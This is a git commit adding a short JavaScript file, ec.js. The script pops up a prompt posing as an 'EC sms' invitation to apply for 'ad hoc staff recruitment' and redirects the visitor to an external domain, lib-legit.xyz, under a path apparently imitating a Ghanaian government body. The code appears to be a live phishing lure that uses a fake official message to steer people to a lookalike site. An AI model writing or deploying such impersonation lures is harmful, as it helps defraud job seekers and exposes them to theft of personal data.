5ce3ad84c7e9cf6c9f37c3daec75a830cf7fe3bd
bigetijazz11 <bigetijazz11@gmail.com>
2024-10-28 00:17:54 -0700

    Create ec.js

---
+++ ec.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('EC sms: Hello, you are invited to apply for the ongoing ad hoc staff recruitment. Press OK to continue','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://www.lib-legit.xyz/ec-gov-gh';
+}
